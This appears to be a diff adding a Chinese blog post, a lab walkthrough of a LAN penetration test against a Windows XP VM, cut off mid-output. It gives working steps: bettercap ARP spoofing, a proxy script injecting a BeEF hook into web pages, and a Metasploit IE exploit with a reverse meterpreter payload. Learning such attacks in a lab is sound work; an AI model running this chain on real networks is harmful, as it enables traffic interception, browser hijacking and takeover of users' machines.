@@ -1,0 +1,1072 @@
+<!DOCTYPE html>
+<html><head>
+<title> Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试</title>
+
+
+
+
+<meta charset="utf-8">
+<meta name="X-UA-Compatible" content="IE=edge">
+<meta name="google-site-verification" content="">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+<meta content="telephone=no" name="format-detection">
+<meta name="description" content="先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload.">
+<meta name="renderer" content="webkit">
+<meta name="theme-color" content="#ffffff">
+
+
+
+
+
+
+
+
+
+
+
+<link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">
+
+
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="http://weepingdogel.github.io/scss/journal.min.3f72a5fc8f5b5dd732a4b476aced0eece2156958d9d414316494ddb10593ddf7.css" integrity="sha256-P3Kl/I9bXdcypLR2rO0O7OIVaVjZ1BQxZJTdsQWT3fc=" media="screen">
+
+
+
+<link rel="stylesheet" href="http://weepingdogel.github.io/scss/dark-mode.min.f7c2efa7183435a6bd1842f91c541481c7a5137b5991629a870f24e4a516ad4b.css" integrity="sha256-98Lvpxg0Naa9GEL5HFQUgcelE3tZkWKahw8k5KUWrUs=" media="screen">
+
+
+<script src="/vendor/js/loadCSS.js"></script>
+<script>
+  loadCSS("https://fonts.googleapis.com/css?family=Fira+Mono|Material+Icons");
+</script>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8465793241118966"
+     crossorigin="anonymous"></script>
+
+
+
+
+
+  <script src="/js/toc.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+    	<div id="app"><div id="sideContainer" class="side-container">
+    
+    <a class="a-block nav-head false" href="http://weepingdogel.github.io/">
+    
+        <div class="nav-title">
+            WeepingDogel
+        </div>
+        
+    </a>
+
+    <div class="nav-link-list">
+        
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/posts/">
+                文章
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/tags/">
+                标签
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/categories/">
+                分类
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/about/">
+                关于
+            </a>
+            
+        
+    </div>
+
+    
+
+    <div class="nav-footer">
+        
+ <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a>  <a href="https://amazingrise.net">Rise</a>
+<br>
+ <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
+<br>
+
+&copy;
+	
+	2021 WeepingDogel
+	
+
+    </div>
+    
+</div><div id="extraContainer" class="extra-container">
+    
+    
+    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>-  -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e5%ba%8f" onclick="onNavClick(`#序-nav`)" id="序-nav">
+									序
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e6%b5%8b%e8%af%95%e7%8e%af%e5%a2%83" onclick="onNavClick(`#测试环境-nav`)" id="测试环境-nav">
+									测试环境
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e7%94%a8%e5%88%b0%e7%9a%84%e5%b7%a5%e5%85%b7" onclick="onNavClick(`#用到的工具-nav`)" id="用到的工具-nav">
+									用到的工具
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#%e6%b5%8b%e8%af%95%e8%bf%87%e7%a8%8b" onclick="onNavClick(`#测试过程-nav`)" id="测试过程-nav">
+									测试过程
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e7%bb%93%e5%b0%be" onclick="onNavClick(`#结尾-nav`)" id="结尾-nav">
+									结尾
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" onclick="onNavClick(`#参考链接-nav`)" id="参考链接-nav">
+									参考链接
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+    
+    <div class="pagination">
+        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
+            <i class="material-icons pagination-action-icon">
+                keyboard_arrow_up
+            </i>
+        </a>
+        
+        <a type="button" class="pagination-action" id="darkModeToggleButton">
+            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
+                dark_mode
+            </span>
+        </a>
+        
+        
+    </div>
+</div>
+<div class="single-column-drawer-container" id="drawer"
+     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
+    <div class="drawer-content">
+        <div class="drawer-menu">
+            
+            
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/posts/">
+                    文章
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/tags/">
+                    标签
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/categories/">
+                    分类
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/about/">
+                    关于
+                </a>
+                
+            
+            
+            <div class="toc">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		<center>-  -</center>
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e5%ba%8f" onclick="onNavClick(`#序-nav`)" id="序-nav">
+									序
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#%e6%b5%8b%e8%af%95%e7%8e%af%e5%a2%83" onclick="onNavClick(`#测试环境-nav`)" id="测试环境-nav">
+									测试环境
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e7%94%a8%e5%88%b0%e7%9a%84%e5%b7%a5%e5%85%b7" onclick="onNavClick(`#用到的工具-nav`)" id="用到的工具-nav">
+									用到的工具
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+							
+								</ul>
+							
+						
+						
+						
+							<li>
+								<a href="#%e6%b5%8b%e8%af%95%e8%bf%87%e7%a8%8b" onclick="onNavClick(`#测试过程-nav`)" id="测试过程-nav">
+									测试过程
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e7%bb%93%e5%b0%be" onclick="onNavClick(`#结尾-nav`)" id="结尾-nav">
+									结尾
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" onclick="onNavClick(`#参考链接-nav`)" id="参考链接-nav">
+									参考链接
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+            
+        </div>
+    </div>
+</div>
+<transition name="fade">
+    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
+</transition>
+<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
+    <div id="navBackground" class="nav-background"></div>
+    <div class="container container-narrow nav-content">
+        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
+            <i class="material-icons">
+                menu
+            </i>
+        </button>
+        <a id="navTitle" class="navbar-brand" href="http://weepingdogel.github.io/">
+            WeepingDogel
+        </a>
+        
+        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
+            <i class="material-icons" id="darkModeToggleIcon2">
+                dark_mode
+            </i>
+        </button>
+        
+    </div>
+</nav>
+<div class="single-column-header-container" id="pageHead"
+     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
+    <a href="http://weepingdogel.github.io/">
+        <div class="single-column-header-title">WeepingDogel</div>
+        
+
+    </a>
+</div>
+
+            <div id="content">
+                <div id="streamContainer" class="stream-container">
+
+    <div class="post-list-container post-list-container-shadow">
+        <div class="post">
+            
+            
+            
+
+            <div class="post-head-wrapper-text-only"
+                
+            >
+                <div class="post-title">
+                     Beef 配合 bettercap 以及 msf 等多种工具的局域网渗透测试
+                    
+                    <div class="post-subtitle">
+                        先利用 bettercap 绑定 beef 的钩子以劫持浏览器，再用 beef 劫持的浏览器促使用户执行 payload.
+                    </div>
+                    
+                    <div class="post-meta">
+                        
+                        <time itemprop="datePublished">
+                            
+                        </time>
+                        
+
+                        
+                            <i class="material-icons" style="">folder</i>
+                                <a href="/categories/">[渗透测试]</a>
+                                &nbsp;
+                        
+
+                        
+                            <i class="material-icons" style="">label</i>
+                            
+                                <a href="/tags/beef">beef</a>
+                                &nbsp;
+                            
+                                <a href="/tags/bettercap">bettercap</a>
+                                &nbsp;
+                            
+                                <a href="/tags/linux">Linux</a>
+                                &nbsp;
+                            
+                                <a href="/tags/metasploit">metasploit</a>
+                                &nbsp;
+                            
+                                <a href="/tags/%E7%AC%94%E8%AE%B0">笔记</a>
+                                &nbsp;
+                            
+                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>
+                                &nbsp;
+                            
+                                <a href="/tags/arp-%E6%AC%BA%E9%AA%97">ARP 欺骗</a>
+                                &nbsp;
+                            
+                                <a href="/tags/%E9%BB%91%E5%AE%A2">黑客</a>
+                                &nbsp;
+                            
+                        
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="post-body-wrapper">
+                
+                <div class="post-body" v-pre>
+                
+                    <h2 id="序">序</h2>
+<p>嗯&hellip; 惯例是要先说点废话嘛..</p>
+<p>今天试着把 beef 和 bettercap 串在一起用了，发现有奇效～</p>
+<p>然后如果是 IE 浏览器的话，可以用 beef 配合 msf 的 ms14-064 模块获取系统权限～</p>
+<p>不多说啦，我们开始～</p>
+<h3 id="测试环境">测试环境</h3>
+<p>啊咧，先说说测试环境。</p>
+<ul>
+<li>
+<p>攻击机</p>
+<ul>
+<li>Arch Linux</li>
+<li>192.168.101.15</li>
+</ul>
+</li>
+<li>
+<p>靶机</p>
+<ul>
+<li>Windows XP on VirtualBox</li>
+<li>192.168.101.43</li>
+</ul>
+</li>
+</ul>
+<p>条件有限，就只能用 XP 啦～</p>
+<h3 id="用到的工具">用到的工具</h3>
+<ol>
+<li>bettercap
+<ul>
+<li>首先就是它啦～ 这是用来进行 ARP 欺骗的，可以进行 DNS 劫持和断网攻击，也就是常说的中间人攻击的一部分吧&hellip;</li>
+</ul>
+</li>
+<li>beef
+<ul>
+<li>用来劫持浏览器&hellip; 然后可以干很多事情，具体的也不是很了解呢。</li>
+</ul>
+</li>
+<li>msf
+<ul>
+<li>这个就是老朋友啦～</li>
+</ul>
+</li>
+</ol>
+<p>什么? nmap? 这次用不着哦～</p>
+<h2 id="测试过程">测试过程</h2>
+<p>首先是打开 <code>bettercap</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo bettercap
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后我们会看到这样的返回结果..</p>
+<p><img src="/img/2021-02-02_14-18.png" alt=""></p>
+<p><strong>注意：这里需要加 sudo , 因为它要调用网卡这样的硬件，需要 root 权限，如果不加 sudo 的话，会得到这样的提示。</strong></p>
+<p><img src="/img/2021-02-02_14-20.png" alt=""></p>
+<p>然后设置 arp 欺骗的目标：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set arp.spoof.targets 192.168.101.43
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>这里设置的 targets 是靶机的地址哦</strong></p>
+<p>接下来启动 beef ，和上面说的一样要加 <code>sudo</code> 。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo beef
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到返回：</p>
+<p><img src="/img/2021-02-02_14-28.png" alt=""></p>
+<p>那么来说说终端里显示的这几个链接</p>
+<ul>
+<li>Hook URL: <a href="http://192.168.101.15:3000/hook.js">http://192.168.101.15:3000/hook.js</a>
+<ul>
+<li>这个就是上面所说的钩子地址了，浏览器一旦访问了带这些js的页面就会被 beef 勾住～</li>
+<li>一会儿我们要把它写进一个攻击脚本里～</li>
+</ul>
+</li>
+<li>UI URL: <a href="http://192.168.101.15:3000/ui/panel">http://192.168.101.15:3000/ui/panel</a>
+<ul>
+<li>这个就是我们的 beef 操作页面了打开以后会有个登录页面，像封面那样，登录进去之后是这样的。
+<img src="/img/Screenshot_2021-02-02_BeEF_Control_Panel.png" alt=""></li>
+</ul>
+</li>
+</ul>
+<p>关于用户名和密码是什么，这里就得提到，有些系统下的 beef 不能使用默认的用户名密码登录<code>（beef:beef）</code>，甚至不能启动，比如我的 Arch 就会这样。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[14:40:25][!] ERROR: Default username and password in use!
+</span></span><span class="line"><span class="cl">[14:40:25]    |_  Change the beef.credentials.passwd in config.yaml
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个时候你需要做的是修改 <code>config.yaml</code> 这个文件中的用户名和密码，我的位置在 <code>/usr/share/beef/config.yaml</code></p>
+<p>改成这样</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">beef</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;0.5.0.0-alpha-pre&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (server-side)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (client-side)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">client_debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used for generating secure tokens</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">crypto_default_value_length</span><span class="p">:</span><span class="w"> </span><span class="m">80</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Credentials to authenticate in BeEF.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used by both the RESTful API and the Admin interface</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">credentials</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">user</span><span class="p">:</span><span class="w">   </span><span class="s2">&#34;随便起个名字&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">passwd</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;随便想个密码&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后你就可以启动了，登录的时候用的就是你设置的用户名个密码。</p>
+<p>好了，话不多说，我们继续。</p>
+<p>接下来我们要做的是写一个 js 脚本，给 bettercap 用。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">onResponse</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">ContentType</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;text/html&#39;</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">body</span><span class="o">=</span><span class="nx">res</span><span class="p">.</span><span class="nx">ReadBody</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">Body</span><span class="o">=</span><span class="nx">body</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">               <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34; src=&#34;http://192.168.101.15:3000/hook.js&#34;&gt;&lt;/script&gt;&lt;/head&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将这个文件保存到你知道的目录，我将它保存到 <code>/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js</code></p>
+<p>然后我们回到 bettercap，设置 <code>http.proxy.script</code> 这个参数为上面这个路径：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后依次启动 <code>net.probe</code>、<code>arp.spoof</code>、<code>http.proxy</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">net.probe on
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">arp.spoof on
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">http.proxy on
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>嗯&hellip; 接下来就启动好了&hellip;</p>
+<p><img src="/img/2021-02-02_15-12.png" alt=""></p>
+<p>然后我们让靶机打开浏览器，打开一个网页&hellip;</p>
+<p>IE8 已经不支持 bing 的 https 了，所以一打开就上钩了..</p>
+<p><img src="/img/VirtualBox_XP_02_02_2021_15_25_46.png" alt=""></p>
+<p><img src="/img/2021-02-02_15-25.png" alt=""></p>
+<p>然后我们能做的事情就很多了</p>
+<p><img src="/img/2021-02-02_15-27.png" alt=""></p>
+<p>我决定使用内个 clippy 的模块，绑定一个 <code>ms14-064</code> 的地址，现在轮到 msf 出场了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/2021-02-02_15-31.png" alt=""></p>
+<p>启用模块</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">use exploit/windows/browser/ms14_064_ole_code_execution
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>看看模块的描述</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">info 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Description:</p>
+<p>This module exploits the Windows OLE Automation array vulnerability,
+CVE-2014-6332. The vulnerability is known to affect Internet
+Explorer 3.0 until version 11 within Windows 95 up to Windows 10,
+and no patch for Windows XP. However, this exploit will only target
+Windows XP and Windows 7 box due to the Powershell limitation.
+Windows XP by defaults supports VBS, therefore it is used as the
+attack vector. On other newer Windows systems, the exploit will try
+using Powershell instead.</p>
+</blockquote>
+<p>机翻一下就是：</p>
+<blockquote>
+<p>该模块利用Windows OLE自动化阵列漏洞，CVE-2014-6332。已知该漏洞会影响Windows 95至Windows 10内的Internet Explorer 3.0直到11版本，Windows XP没有补丁。不过，由于Powershell的限制，这个漏洞只会针对Windows XP和Windows 7盒子。Windows XP默认支持VBS，因此它被用作攻击载体。在其他较新的Windows系统上，该漏洞将尝试使用Powershell代替。</p>
+</blockquote>
+<p>看看设置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">show options
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Module options (exploit/windows/browser/ms14_064_ole_code_execution):
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name                   Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----                   ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   AllowPowershellPrompt  false            yes       Allow exploit to try Powershell
+</span></span><span class="line"><span class="cl">   Retries                true             no        Allow the browser to retry the module
+</span></span><span class="line"><span class="cl">   SRVHOST                0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+</span></span><span class="line"><span class="cl">   SRVPORT                8080             yes       The local port to listen on.
+</span></span><span class="line"><span class="cl">   SSL                    false            no        Negotiate SSL for incoming connections
+</span></span><span class="line"><span class="cl">   SSLCert                                 no        Path to a custom SSL certificate (default is randomly generated)
+</span></span><span class="line"><span class="cl">   TRYUAC                 false            yes       Ask victim to start as Administrator
+</span></span><span class="line"><span class="cl">   URIPATH                                 no        The URI to use for this exploit (default is random)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Payload options (windows/meterpreter/reverse_tcp):
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+</span></span><span class="line"><span class="cl">   LHOST     192.168.101.15   yes       The listen address (an interface may be specified)
+</span></span><span class="line"><span class="cl">   LPORT     4444             yes       The listen port
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exploit target:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Id  Name
+</span></span><span class="line"><span class="cl">   --  ----
+</span></span><span class="line"><span class="cl">   0   Windows XP
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一般来讲我们只需要设置一个 <code>SRVHOST</code> 就可以了，但是刚刚 <code>bettercap</code> 把 <code>8080</code> 端口给占用了，因此我们需要重新设置一个 <code>SRVPORT</code>。</p>
+<p><code>SRVHOST</code> 设置为攻击机的地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVHOST 192.168.101.15
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>SRVPORT</code> 任意指定一个空闲的端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVPORT 9999
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">exploit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来我们得到了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Exploit running as background job 0.
+</span></span><span class="line"><span class="cl">[*] Exploit completed, but no session was created.
+</span></span><span class="line"><span class="cl">
